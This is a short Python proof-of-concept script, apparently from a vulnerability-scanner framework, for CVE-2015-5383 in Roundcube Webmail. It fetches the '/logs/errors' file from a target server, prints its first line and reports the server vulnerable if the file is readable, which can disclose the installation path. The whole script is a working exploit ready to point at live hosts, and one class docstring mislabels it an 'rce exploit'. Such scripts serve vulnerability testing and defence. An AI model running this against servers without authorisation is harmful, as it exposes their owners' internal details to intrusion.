#!/usr/bin/env python
# -*- coding:utf-8 -*-

import requests
import time
import re

"""
    Roundcube Webmail information leakage(CVE-2015-5383)
    ------------
    CVE : CVE-2015-5383
    Affected Versions: 1.1.x < 1.1.2(1.1.3,1.1.5亲测都有效)

    Requirements
    ------------
    - None

    References :
        http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5383
        https://github.com/roundcube/roundcubemail/issues/4816

    Exploit:
        check url http://mail.roundcube.com/roundcubemail/logs/errors
        the root path of roundcube webmail will be disclosed

"""

description = "Roundcube Webmail information leakage(CVE-2015-5383)"

url = 'http://mail.roundcube.com/roundcubemail/'


class roundcube():
    """
    roundcube rce exploit class
    """

    def check_info_disclose(self, url):
        # 检测是否存在信息泄露
        print('url : {}'.format(url))
        req = requests.get(url, timeout=3)

        # 读出第一条./logs/errors记录
        line = req.text.split('\n')[0]
        if line:
            print(line)

        # 如果可以读到这个文件,status_code = 200,即有效
        if req.status_code == 200:
            return True

    def auto_exploit(self, url):
        """
        Auto exploit Roundcube Webmail base on self class functions
        :param url: the remote system to test
        :return: True
        """
        url = '{}{}'.format(url, '/logs/errors')
        return self.check_info_disclose(url)


def poc(url):

    # just give roundcubemail url
    url = 'http://{}'.format(url)

    try:
        return roundcube().auto_exploit(url)
    except:
        return False

